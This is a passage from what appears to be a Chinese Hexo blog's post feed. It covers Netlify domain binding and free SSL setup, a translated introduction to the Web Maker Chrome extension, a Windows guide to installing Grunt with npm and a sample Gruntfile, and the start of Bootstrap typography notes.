<p><img src="https://www.freehao123.com/wp-content/uploads/2017/05/netlify_17.gif" alt="GitHub Desktop执行成功" /></p>
<p><strong>五、Netlify绑定域名方法</strong></p>
<p>1、点击Netlify页面左上角netlify的logo，你便可以进入静态空间的设置中心。然后请先记录下系统默认给你分配的二级域名，稍后会用到。在接下来点击&quot;set up domain&quot;，输入你要绑定的域名，点击&quot;save&quot;保存即可。</p>
<p><img src="https://www.freehao123.com/wp-content/uploads/2017/05/netlify_19.gif" alt="Netlify绑定域名" /></p>
<p>2、输入你想要绑定的域名。</p>
<p><img src="https://www.freehao123.com/wp-content/uploads/2017/05/netlify_20.gif" alt="Netlify输入自己的域名" /></p>
<p>3、确认后，你就可以看到域名已经成功绑定上了。你可以随时修改域名绑定。</p>
<p><img src="https://www.freehao123.com/wp-content/uploads/2017/05/netlify_21.gif" alt="Netlify绑定成功" /></p>
<p>4、到你的域名DNS解析处，修改域名的CNAME记录，记录值就是刚刚你记下的Netlify二级域名。</p>
<p><img src="https://www.freehao123.com/wp-content/uploads/2017/05/netlify_22.gif" alt="Netlify作域名DNS记录" /></p>
<p>5、域名绑定完成。</p>
<p><img src="https://www.freehao123.com/wp-content/uploads/2017/05/netlify_23.gif" alt="Netlify解析完成" /></p>
<p><strong>六、Netlify添加免费SSL证书</strong></p>
<p>1、设置完成域名绑定之后，设置中心的选项会有少许变化。会增加一个Enable HTTPS的选项。</p>
<p><img src="https://www.freehao123.com/wp-content/uploads/2017/05/netlify_24.gif" alt="Netlify开启Https" /></p>
<p>2、点进去，然后选择&quot;Let’s Encrypt Certificate&quot;按钮，系统会自动签发<a href="https://www.freehao123.com/tag/lets-encrypt/" target="_blank" rel="noopener">Let’s Encrypt</a>证书给你的站点。</p>
<p><img src="https://www.freehao123.com/wp-content/uploads/2017/05/netlify_25.gif" alt="Netlify签发域名" /></p>
<p>3、不过前提条件是你的域名已经解析生效了。如果解析还没有生效，那么体会提示&quot;签发失败&quot;的错误。</p>
<p><img src="https://www.freehao123.com/wp-content/uploads/2017/05/netlify_26.gif" alt="Netlify生成证书成功" /></p>
<p>4、如果你想一直使用Https访问的话，可以勾选强制所有的访问转为Https。</p>
<p><img src="https://www.freehao123.com/wp-content/uploads/2017/05/netlify_27.gif" alt="Netlify强制跳转" /></p>
<p>5、Netlify添加免费SSL证书成功。</p>
<p><img src="https://www.freehao123.com/wp-content/uploads/2017/05/netlify_28.gif" alt="Netlify添加证书成功" /></p>
<p>6、Netlify空间演示：</p>
<ul>
<li>1、博客演示：<a href="https://blog.ps/" target="_blank" rel="noopener">https://blog.ps/</a></li>
<li>2、主页演示：<a href="https://preacher-chipmunk-31460.netlify.com/freehao123/" target="_blank" rel="noopener">https://preacher-chipmunk-31460.netlify.com/freehao123/</a></li>
<li>3、绑定域名：<a href="https://netlify.freehao123.info/" target="_blank" rel="noopener">https://netlify.freehao123.info/</a></li>
</ul>
<p><strong>七、Netlify空间使用技巧</strong></p>
<p>**1、Netlify可以直接添加html代码。**在Netlify面板可以直接一键添加html代码到你的网站之前，这样你就可以很方便的把网站统计代码加到网站上了。</p>
<p><img src="https://www.freehao123.com/wp-content/uploads/2017/05/netlify_30.gif" alt="Netlify添加代码" /></p>
<p>**2、Netlify可以设置变量及命令。**Netlify的免费用户可以为自己的网站设置环境变量、hooks等等。而付费用户则可以为网站设置更加详细的SEO优化。（点击放大）</p>
<p><img src="https://www.freehao123.com/wp-content/uploads/2017/05/netlify_31-530x300.gif" alt="Netlify设置变量" /></p>
<p>**3、Netlify的访问速度不错。**在首页的地图标注上，是有国内节点的（当然也有可能是宣传画而已）。实测大陆访问全部解析到Amazon日本东京节点上，速度表现尚可。</p>
<p><img src="https://www.freehao123.com/wp-content/uploads/2017/05/netlify_29.gif" alt="Netlify速度快" /></p>
]]></content>
      <categories>
        <category>搬运整理</category>
      </categories>
      <tags>
        <tag>Netlify</tag>
      </tags>
  </entry>
  <entry>
    <title>Web Maker——一款基于浏览器的可离线的CodePen替代品</title>
    <url>/hexolog/post/3aa76942.html</url>
    <content><![CDATA[<p>译自: <a href="https://www.sitepoint.com/web-maker-an-offline-browser-based-codepen-alternative/" target="_blank" rel="noopener">Web Maker, an Offline, Browser-based CodePen Alternative</a> ——by <a href="https://github.com/chinchang/" target="_blank" rel="noopener">Kushagra Gaur</a></p>
<blockquote>
<p><a href="https://medium.com/web-maker/web-maker-3-0-is-here-f158a40eeaee" target="_blank" rel="noopener">新版本3.0介绍</a><br />
3.0版本开始，有了登录功能，可在线保存。同时还有了 <a href="https://webmakerapp.com/app/" target="_blank" rel="noopener">web app</a>，这意味着在各种现代浏览器中都可以使用 web maker 了，如：Firefox 58+, Edge。<br />
<img src="https://github.com/chinchang/web-maker/raw/master/ss1.png" alt="img1" /><br />
本文，Kushagra Gaur介绍了一款他本人专为那些需要一个响应迅速且可离线工作的Web平台编译器的前端开发者而制作的浏览器扩展插件 —— <a href="https://webmakerapp.com/" target="_blank" rel="noopener">Web Maker</a>。</p>
</blockquote>
<h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2>
<p>如果你像我一样也是一位前端开发人员，你可能试用过一个或多个代码编译器像 <a href="https://codepen.io/" target="_blank" rel="noopener">CodePen</a>、 <a href="http://jsbin.com/" target="_blank" rel="noopener">JSBin</a>、 <a href="https://jsfiddle.net/" target="_blank" rel="noopener">JSFiddle</a> 等（我们国内有 <a href="http://jsrun.net/" target="_blank" rel="noopener">JSRun</a>、<a href="http://runjs.cn/" target="_blank" rel="noopener">RunJs</a>）。这些都很好，能完美的满足我们的工作需求。我主要用他们来分析解决我所遇到的问题，或者用来与同事讨论的一些代码片段。但使用这些工具必须要连网，这样连网加载这些应用时就总会有固有延迟。而这也总使我感到不爽。</p>
<a id="more"></a>
<p>当外出旅行或在机场等机时，我可能也需要一个快速的途径来编译或调试代码，然而这种场景下是没有网络的，也就意味着之前提到的那些在线编译器都不能用。那该在呢么办呢？当然，你可以使用编辑器，并在浏览器中查看效果—但在这个快节奏的世界，这样操作就显得有些慢了！</p>
<p>我试着去寻找一款能满足我这种需求的编译器，然而一款也没找着。另外，我发现许多人同我一样也在寻找着这样一个东西︰ <a href="https://twitter.com/armstrong/status/567403700713717763" target="_blank" rel="noopener">https://twitter.com/armstrong/status/567403700713717763</a> 于是决定自己来解决这个问题，然后就开发出了 <a href="https://webmakerapp.com/" target="_blank" rel="noopener">Web Maker</a>。现在我所有的 web 开发项目都会用 <a href="https://webmakerapp.com/" target="_blank" rel="noopener">Web Maker</a>，甚至在维护与再开发 <a href="https://webmakerapp.com/" target="_blank" rel="noopener">Web Maker</a>本身时也是如此！<br />
<img src="http://opifddwc7.bkt.clouddn.com/18-1-7/79295989.jpg" alt="img1" /></p>
<h2 id="web-maker-是什么"><a class="markdownIt-Anchor" href="#web-maker-是什么"></a> Web Maker 是什么 ？</h2>
<p>Web Maker 是一款 <a href="https://chrome.google.com/webstore/detail/web-maker/lkfkkhfhhdkiemehlpkgjeojomhpccnh?utm_source=chrome-ntp-icon" target="_blank" rel="noopener">Chrome 扩展插件</a>，将你浏览器的新选项卡 （可选） 转换成 web 编译器，你可以在其中编写 HTML、CSS 和 JavaScript，同时还可以实时预览页面效果。这款插件已经有上千(现在为4万5千多)用户了，在 <a href="https://chrome.google.com/webstore/detail/web-maker/lkfkkhfhhdkiemehlpkgjeojomhpccnh?utm_source=chrome-ntp-icon" target="_blank" rel="noopener">Chrome Web Store</a>上可提供下载。<br />
<strong>下载地址：</strong><a href="https://chrome.google.com/webstore/detail/web-maker/lkfkkhfhhdkiemehlpkgjeojomhpccnh?utm_source=chrome-ntp-icon" target="_blank" rel="noopener">Chrome Web Store</a>（需要翻墙。翻不了墙的也可从<a href="https://github.com/chinchang/web-maker" target="_blank" rel="noopener">Github</a>中下载后采取<a href="https://github.com/kuleyu/IFE-Tasks/issues/1" target="_blank" rel="noopener">这种方法</a>安装。注：步骤4对应下载包里的src文件夹）。</p>
<h2 id="特点"><a class="markdownIt-Anchor" href="#特点"></a> 特点</h2>
<h3 id="速度极快可离线工作"><a class="markdownIt-Anchor" href="#速度极快可离线工作"></a> 速度极快，可离线工作</h3>
<p>作为一款 chrome 扩展插件， Web Maker 完全寄生在你的浏览器中。它没有涉及到网络需求（除非你正在使用一个第三方的 JavaScript 和 CSS 库）。所以它初始启动迅速。不仅如此，而且你对代码所做的的每一次中每次变动都能在预览中即时自动刷新。当然，如果仅仅只是 CSS 的变动，它甚至连刷新不需要就直接显示出来。</p>
<p>你还可以选择保存或者加载你编辑好的项目以便以后再次编辑。它们会被保存在您的浏览器的本地存储中</p>
<h3 id="预处理器支持"><a class="markdownIt-Anchor" href="#预处理器支持"></a> 预处理器支持</h3>
<p>预处理器是几乎每个开发人员的工具链中的一个组成部分。Web Maker 为你提供了HTML、CSS 以及 JavaScript三种语言中所有最常用的预处理器，包括 Markdown、Jade、SCSS、Less、JSX 以及 TypeScript。</p>
<p>如果您需要在你的项目中使用外部的 JavaScript 或 CSS 库 （如 jQuery 或 Bootstrap），你只需简单点击一下”Add Library”按钮，从可用列表中，选择其中一个最受欢迎的库或输入任何库的名称，从显示的自动建议项中选择它即可。</p>
<h3 id="多种布局"><a class="markdownIt-Anchor" href="#多种布局"></a> 多种布局</h3>
<p>除了有多个编辑器布局选项，你所保存的每个项目都记得其上次使用的布局选项，以及三个代码编辑窗口的大小。所以，基本上，每当你重新加载之前的任何项目时，你都会得到与你上次保存时完全相同的编辑器配置。</p>
<p>此外，要想在实际的浏览器窗口大小下查看你的项目，只需切换到全屏布局模式即可。</p>
<h3 id="预览区域截屏功能"><a class="markdownIt-Anchor" href="#预览区域截屏功能"></a> 预览区域截屏功能</h3>
<p>Chrome 扩展的 API 赋予了 Web Maker 强大的能力去做那些普通的 web 应用难以实现的功能。比如说截图捕获功能，只需单击一下 Take Screenshot 按钮即可随时得到预览区域的截图。</p>
<h3 id="可另存为-html-或在-codepen-中打开"><a class="markdownIt-Anchor" href="#可另存为-html-或在-codepen-中打开"></a> 可另存为 HTML 或在 CodePen 中打开</h3>
<p>在 Web Maker 中完成了你的项目后，如果想在其他地方使用它，你并不需要将它复制粘贴到一些文件中，你只需点击 Save as HTML file 选项即可将你项目中的 HTML、 CSS 和 JavaScript 代码嵌入到一个 HTML 文件中。</p>
<p>或者说你想要与世界分享你的项目︰Open on CodePen 按钮可以在 CodePen 中打开你的项目。</p>
<h3 id="源代码开源"><a class="markdownIt-Anchor" href="#源代码开源"></a> 源代码开源</h3>
<p>我（Kushagra Gaur）已经将 Web Maker 在 <a href="https://github.com/chinchang/web-maker" target="_blank" rel="noopener">GitHub</a> 上开源了，我认为这样可以让我接触到更多的用户，他们可以根据他们的需求提出各种建议或标记出他们所遇到的问题，这样就可以更集中地将问题反馈上来。</p>
<p>在打造这样一款 Web 平台编译器时用到了许多有趣的逻辑块。所有这些都是从开源项目中借鉴的。我个人工作中喜欢使用 Esprima 来预防无限循环。</p>
<p>Web Maker 中大量地使用了一些值得膜拜的开源项目如: <a href="https://codemirror.net/" target="_blank" rel="noopener">CodeMirror</a>、<a href="http://esprima.org/" target="_blank" rel="noopener">Esprima</a>、<a href="http://esprima.org/" target="_blank" rel="noopener">Split.js</a>、<a href="https://github.com/estools/escodegen" target="_blank" rel="noopener">Escodegen</a>、<a href="https://github.com/enjalot/Inlet" target="_blank" rel="noopener">Inlet.js</a>、<a href="http://emmet.io/" target="_blank" rel="noopener">Emmet</a> 等。谨此向这些开源项目的作者们表示感谢！如前所述，Web Maker 在开发过程中也使用了 Web Maker。</p>
<h2 id="您可以使用-web-maker-来做什么"><a class="markdownIt-Anchor" href="#您可以使用-web-maker-来做什么"></a> 您可以使用 Web Maker 来做什么</h2>
<p>除了用于通常的 web 开发工作以外，Web Maker 可以用到很多有趣的方面。让我们来看看其中的一些吧。</p>
<p><strong>学习的过程中实践，省去安装的麻烦</strong></p>
<p>如果你正在开始学习 web 开发，Web Maker 是一个你日常练习、作业等的好地方。你可以专注于编写代码而无需分心去设置编辑器或者使用预处理器时代码的生成过程</p>
<p><strong>为您的应用程序创建独立的组件</strong></p>
<p>近期，<a href="https://medium.com/@dan.shapiro1210/understanding-component-based-architecture-3ff48ec0c238#.je0xb7sbk" target="_blank" rel="noopener">基于组件的体系结构</a>正被广泛的用于 web 应用程序的设计中。无论你们正在使用 react、Vue 还是其他某个 JavaScript 框架，每个人都朝着使各自的应用程序成为独立组件的集合的方向设计。</p>
<p>您可以在 Web Maker 中开发或者快速地试用这些独立的组件，— — 喜欢的话，也可以将它们集成到你的应用程序中。</p>
<p><strong>作为一款 Markdown 编辑器</strong></p>
<p>Web Maker 并不仅仅限于 web 开发。如今，很多博主通常都用 Markdown 来写博客或文章，以至于他们经常要用到 Markdown 编辑器。你可以将 Web Maker 变成一款 Markdown 编辑器，并且可以非常快速地实时预览。（这篇文章是用 Web Maker 写的）。<br />
<img src="http://opifddwc7.bkt.clouddn.com/18-1-7/98900803.jpg" alt="img3" /></p>
<p><strong>作为在课堂里教学生的工具</strong></p>
<p>由于 Web Maker 可以离线运行，因而它又是一个很好的平台可以在课堂上供学生们探索实践巩固他们所学到的新东西。</p>
<p><strong>（可以运行代码片段）调试时帮助减少测试项</strong><br />
当你试图查找你应用程序中的某个 bug 时，有必要隔离可疑组件，这样你就可以在一个更小的环境中进行调试，不受应用程序中其余部分的任何干扰。 Web Maker 就是这样一个可以快速运行一段代码的很好的工具。</p>
<p><strong>存储你最喜爱的代码片段</strong></p>
<p>在网站上找到了一些有趣的代码段时，你不必记住或记下该网页地址，只需打开 Web Maker ，将代码片段粘贴到相应区域，然后给它取个名称并保存即可。这样以后需要参考或编辑时你只要再打开就可以了。</p>
<h2 id="即将到来的一些新功能"><a class="markdownIt-Anchor" href="#即将到来的一些新功能"></a> 即将到来的一些新功能</h2>
<p>这些是 Web Maker 一些新功能（已经在新版2.4.0中实现）︰</p>
<blockquote>
<p><strong>导入/导出</strong>。很快就会有选项可以导出你的作品，而且它们也可以再次导入到 Web Maker。你还能够创建备份到云端（如 Google Drive 的服务）。</p>
</blockquote>
<blockquote>
<p><strong>自定义编辑器</strong>。更多的自定义设置是也在准备中，其中包括能够设置字体大小、 主题和缩进。</p>
</blockquote>
<blockquote>
<p><strong>快捷键</strong> 快捷键支持。<br />
更多详细信息请参考 <a href="https://github.com/chinchang/web-maker/issues" target="_blank" rel="noopener">GitHub issues</a> 页面中的 roadmap（版本更新线路图）。</p>
</blockquote>
]]></content>
      <categories>
        <category>翻译</category>
      </categories>
      <tags>
        <tag>web maker</tag>
        <tag>编辑器</tag>
        <tag>Chrome插件</tag>
        <tag>living preview</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows 下安装 Grunt 的指南和相关说明</title>
    <url>/hexolog/post/9862.html</url>
    <content><![CDATA[<p><a href="http://www.bluesdream.com/blog/windows-installs-the-grunt-and-instructions.html" target="_blank" rel="noopener" title="Permalink to Windows下安装Grunt的指南和相关说明 | 蓝色梦想">转载 - 蓝色梦想</a></p>
<p>Grunt基于Node.js，其中 npm 是 Node.js 的包管理器，而Grunt和Grunt插件就通过 npm 安装并管理。</p>
<p>Grunt 0.4.x 必须配合Node.js &gt;= 0.8.0版本使用。</p>
<p><strong>安装Node.js：</strong><br />
去<a href="http://nodejs.org/" target="_blank" rel="noopener">Node.js官网</a>，点击INSTALL下载并安装，现在的Node.js会自动安装npm。</p>
<p>安装完成之后，打开命令行，进行后续的操作（开始-&gt;输入CMD 或 开始-&gt;所有程序 -&gt;命令提示符）。</p>
<p>进入Node.js的安装目录（默认路径为&quot;C:Program Filesnodejs&quot;）：<br />
cd pro<em>nod</em></p>
<p>可以通过以下2个命令，查看 node.js 和 npm 的版本号：<br />
node -v<br />
npm -v</p>
<a id="more"></a>
<p><strong>安装Grunt：</strong><br />
如果你之前安装过老的0.3版本，请先卸载：<br />
npm uninstall -g grunt</p>
<p>安装Grunt命令行（CLI）：<br />
npm install -g grunt-cli</p>
<p>注1：-g代表全局安装，Grunt有二个版本：服务器端版本（grunt）和客户端版本（grunt-cli）。</p>
<p>注2：安装grunt-cli并不等于安装了grunt！grunt CLI的任务很简单：调用与Gruntfile在同一目录中的grunt。这样带来的好处是，允许你在同一个系统上同时安装多个版本的grunt。而grunt使用模块结构，除了安装命令行界面以外，还要根据需要安装相应的模块。这些模块应该采用局部安装，因为不同项目可能需要同一个模块的不同版本。</p>
<p>上述命令执行完后，grunt 命令就被加入到你的系统路径中了，以后就可以在任何目录下执行此命令了。</p>
<p><strong>创建新的Grunt项目：</strong><br />
假设这个项目安装在D盘根目录，我们首先进度D盘：<br />
d:</p>
<p>创建项目文件夹：<br />
mkdir testProject</p>
<p>进入文件夹：<br />
cd testProject</p>
<p>接着在你的项目文件夹根目录下添加两个文件：package.json 和 Gruntfile。</p>
<p>package.json: 此文件被npm用于存储项目的元数据，以便将此项目发布为npm模块。<br />
Gruntfile: 此文件被命名为 Gruntfile.js 或 Gruntfile.coffee，用来配置或定义任务（task）并加载Grunt插件。</p>
<p><strong>创建package.json文件：</strong><br />
package.json应当放置于项目的根目录中，与Gruntfile在同一目录中，并且应该与项目的源代码一起被提交。大部分 grunt-init 模版都会自动创建特定于项目的package.json文件。</p>
<p>方法一：执行 npm init (选方法一。方法二手动添加后在安装时出现错误)命令（根据默认的grunt-init模板，引导你创建一个&quot;基本&quot;的package.json文件）：<br />
npm init</p>
<p>根据提示填写信息（都允为空）：</p>
<pre><code>name: (GruntT)　　　　　　// 模块名称：只能包含小写字母数字和中划线，如果为空则使用项目文件夹名称代替
version: (0.0.0)　　　　　// 版本号
description:　　　　　　　// 描述：会在npm搜索列表中显示
entry point: (index.js)　// 模块入口文件
test command:　　　　　　　// 测试脚本
git repository:　　　　　　// git仓库地址
keywords:　　　　　　　　　// 关键字：用于npm搜索，多个关键字用空格分开
author:　　　　　　　　　　// 作者
license: (BSD-2-Clause) 　// 开原协议
</code></pre>
<p>方法二：手动创建package.json文件，添加项目/模块的描述信息：</p>
<pre><code>{
　&quot;name&quot;: &quot;my-project&quot;,
　&quot;version&quot;: &quot;0.1.0&quot;
}
</code></pre>
<p>附：<br />
<a href="https://npmjs.org/doc/json.html" target="_blank" rel="noopener">package.json官方文档</a><br />
<a href="https://github.com/spmjs/spm/wiki/package.json" target="_blank" rel="noopener">一个较完整的package.json文件</a></p>
<p><strong>安装Grunt和Grunt插件：</strong><br />
方法一：手动添加，修改package.json文件：</p>
<pre><code>{
　&quot;name&quot;: &quot;my-project&quot;,
　&quot;version&quot;: &quot;0.1.0&quot;,
　&quot;devDependencies&quot;: {
　　&quot;grunt&quot;: &quot;~0.4.1&quot;,
　　&quot;grunt-contrib-cssmin&quot;: &quot;~0.7.0&quot;
　}
}
</code></pre>
<p>注：devDependencies里面的参数，指定了项目依赖的Grunt和Grunt插件版本。其中&quot;~0.7.0&quot;代表安装该插件的某个特定版本，如果只需安装最新版本，可以改成&quot;*&quot;。</p>
<p>然后执行：<br />
npm install</p>
<p>这时你会发现项目文件夹中多了个node_modules文件夹，其里面就是对应的Grunt和Grunt插件。</p>
<p>方法二：自动安装：<br />
通过 npm install  --save-dev 命令</p>
<p>安装最新版的Grunt：<br />
npm install grunt --save-dev</p>
<p>接着安装我们所需要的插件：<br />
npm install grunt-contrib-cssmin --save-dev</p>
<p>注：其中–save-dev，表示将它作为你的项目依赖添加到package.json文件中devDependencies内。如果你要安装指定版本的Grunt或者Grunt插件，只需要运行npm install grunt@VERSION --save-dev命令，其中VERSION就是你所需要的版本(指定版本号即可)。</p>
<p>附：<a href="http://gruntjs.com/plugins" target="_blank" rel="noopener">Grunt官方插件列表</a>，其中带星号的为官方维护的插件。</p>
<p><strong>创建Gruntfile.js文件：</strong></p>
<pre><code>module.exports = function(grunt) {

    // 配置任务参数
    grunt.initConfig({
        pkg: grunt.file.readJSON('package.json'),
        cssmin: {
            combine: {
                files: {
                  'css/release/compress.css': ['css/*.css'] // 指定合并的CSS文件 ['css/base.css', 'css/global.css']
                }
            },
           minify: {
                options: {
                    keepSpecialComments: 0, /* 删除所有注释 */
                    banner: '/* minified css file */'
                },
                files: {
                    'css/release/master.min.css': ['css/master.css']
                }
            }
        }
    });

    // 插件加载（加载 &quot;cssmin&quot; 模块）
    grunt.loadNpmTasks('grunt-contrib-cssmin');

    // 自定义任务：通过定义 default 任务，可以让Grunt默认执行一个或多个任务。
    grunt.registerTask('default', ['cssmin']);

};
</code></pre>
<p>执行配置中所有的任务：<br />
grunt</p>
<p>执行某个特定的任务：<br />
grunt cssmin</p>
<p><strong>测试：</strong><br />
接着我们在项目文件夹中创建个子文件夹，命名为：CSS</p>
<p>并且在里面创建base.css和master.css，2个CSS文件，你可以随便写点内容在里面。</p>
<p>然后在命令行中执行grunt，看到如下提示说明执行成功：<br />
Running “cssmin:combine” (cssmin) task<br />
File css/release/compress.css created.</p>
<p>Running “cssmin:minify” (cssmin) task<br />
File css/release/master.min.css created.</p>
<p>Done, without errors.</p>
<p>参考文档：</p>
<p>NIGHT MODE</p>
]]></content>
      <categories>
        <category>搬运整理</category>
      </categories>
      <tags>
        <tag>Grunt</tag>
      </tags>
  </entry>
  <entry>
    <title>bootstrap笔记总结</title>
    <url>/hexolog/post/2e40f178.html</url>
    <content><![CDATA[<blockquote>
<p>原文出处 <a href="http://blog.poetries.top/2016/11/19/bootstrap-review" target="_blank" rel="noopener">http://blog.poetries.top/2016/11/19/bootstrap-review</a></p>
</blockquote>
<p>最近项目中用到<code>bootstrap</code> 很是健忘各种属性类名，频繁翻阅文档，在这里暂且记录一下笔记</p>
<a id="more"></a>
<h4 id="一-bootstrap简介"><a class="markdownIt-Anchor" href="#一-bootstrap简介"></a> 一、 <code>bootstrap</code>简介</h4>
<hr />
<ul>
<li><code>Bootstrap</code>，来自 <code>Twitter</code>（全国最大的微博），是目前最受欢迎的前端框架。</li>
<li><code>bootstrap</code>下载及演示 <a href="http://v3.bootcss.com" target="_blank" rel="noopener">http://v3.bootcss.com</a></li>
<li>什么是<code>bootstrap</code>？
<ul>
<li><code>Bootstrap</code>是基于 <code>HTML</code>、<code>CSS</code>、<code>JAVASCRIPT</code> 的开源框架，它简洁、直观、强悍、灵活，使得 <code>Web</code>开发更加快捷，</li>
<li>用于开发响应式布局、移动设备优先的 <code>WEB</code>项目。</li>
</ul>
</li>
<li>为什么使用 <code>Bootstrap</code>？
<ul>
<li>跨设备</li>
<li>跨浏览器（<code>chrome</code>，<code>IE9</code>以上，<code>Firefox</code>，<code>Safari</code>，<code>Opera</code>…）</li>
<li>响应式布局</li>
<li>具有实用性强的组件</li>
<li>内置<code>jquery</code>插件</li>
</ul>
</li>
<li><code>bootstrap</code>的结构
<ul>
<li>主要分为三大核心模块：<code>css</code>、<code>js</code>、<code>font</code></li>
</ul>
</li>
</ul>
<h4 id="二-bootstrap排版样式"><a class="markdownIt-Anchor" href="#二-bootstrap排版样式"></a> 二、<code>bootstrap</code>排版样式</h4>
<hr />
<ul>
<li><strong>标题</strong>
<ul>
<li>从 <code>h1</code> 到 <code>h6</code></li>
</ul>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Bootstrap 排版<span class="tag">&lt;/<span class="name">h1</span>&gt;</span> //36px</span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>Bootstrap 排版<span class="tag">&lt;/<span class="name">h2</span>&gt;</span> //30px</span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>Bootstrap 排版<span class="tag">&lt;/<span class="name">h3</span>&gt;</span> //24px</span><br><span class="line"><span class="tag">&lt;<span class="name">h4</span>&gt;</span>Bootstrap 排版<span class="tag">&lt;/<span class="name">h4</span>&gt;</span> //18px</span><br><span class="line"><span class="tag">&lt;<span class="name">h5</span>&gt;</span>Bootstrap 排版<span class="tag">&lt;/<span class="name">h5</span>&gt;</span> //14px</span><br><span class="line"><span class="tag">&lt;<span class="name">h6</span>&gt;</span>Bootstrap 排版<span class="tag">&lt;/<span class="name">h6</span>&gt;</span> //12px</span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>bootstrap课程<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"lead"</span>&gt;</span>hello world<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>内联文本元素
<ul>
<li>添加标记，<code>&lt;mark&gt;</code>元素或<code>.mark</code> 类</li>
</ul>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Bootstrap<span class="tag">&lt;<span class="name">mark</span>&gt;</span>排版<span class="tag">&lt;/<span class="name">mark</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--各种加线条的文本--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">del</span>&gt;</span>Bootstrap 排版<span class="tag">&lt;/<span class="name">del</span>&gt;</span>  //删除的文本</span><br><span class="line"><span class="tag">&lt;<span class="name">s</span>&gt;</span>Bootstrap 排版<span class="tag">&lt;/<span class="name">s</span>&gt;</span>  //无用的文本</span><br><span class="line"><span class="tag">&lt;<span class="name">ins</span>&gt;</span>Bootstrap 排版<span class="tag">&lt;/<span class="name">ins</span>&gt;</span>  //插入的文本</span><br><span class="line"><span class="tag">&lt;<span class="name">u</span>&gt;</span>Bootstrap 排版<span class="tag">&lt;/<span class="name">u</span>&gt;</span>  //效果同上，下划线文本</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--各种强调的文本--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">small</span>&gt;</span>Bootstrap 排版<span class="tag">&lt;/<span class="name">small</span>&gt;</span>  //标准字号的 85%</span><br><span class="line"><span class="tag">&lt;<span class="name">strong</span>&gt;</span>Bootstrap 排版<span class="tag">&lt;/<span class="name">strong</span>&gt;</span>    //加粗 700</span><br><span class="line"><span class="tag">&lt;<span class="name">em</span>&gt;</span>Bootstrap 排版<span class="tag">&lt;/<span class="name">em</span>&gt;</span>    //倾斜</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"text-left"</span>&gt;</span>向左对齐文本<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span>居中对齐文本<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"text-right"</span>&gt;</span>向右对齐文本<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"text-justify"</span>&gt;</span>对齐文本。该段落会根据屏幕的大小对超出屏幕的文字进行换行<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"text-nowrap"</span>&gt;</span>该段落不会根据屏幕的大小对超出屏幕的文字进行换行。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"text-lowercase"</span>&gt;</span>BOOTSTROP<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"text-uppercase"</span>&gt;</span>bootstrap<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"text-capitalize"</span>&gt;</span>bootstrap<span class="tag">&lt;/<span class="name">p</span>&gt;</span> //单词首字母大写</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>缩略语</strong>
<ul>
<li><code>HTML</code>元素提供了用于缩写的标记，比如 <code>WWW</code> 或 <code>HTTP</code>。<code>Bootstrap</code> 定义 <code>&lt;abbr&gt;</code> 元素的样式为显示在文本底部的一条虚线边框</li>
<li>当鼠标悬停在上面时会显示完整的文本（只要您为 <code>&lt;abbr&gt;</code> title 属性添加了文本）。为了得到一个更小字体的文本，</li>
<li>请添加 <code>.initialism</code> 到 <code>&lt;abbr&gt;</code></li>
</ul>
</li>
</ul>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">abbr</span> <span class="attr">title</span>=<span class="string">"World Wide Web"</span>&gt;</span>WWW<span class="tag">&lt;/<span class="name">abbr</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">abbr</span> <span class="attr">title</span>=<span class="string">"Real Simple Syndication"</span> <span class="attr">class</span>=<span class="string">"initialism"</span>&gt;</span>RSS<span class="tag">&lt;/<span class="name">abbr</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>地址</strong>
<ul>
<li><code>address</code>默认为 <code>display:block</code>;，需要使用标签来为封闭的地址文本添加换行</li>
</ul>
</li>
</ul>
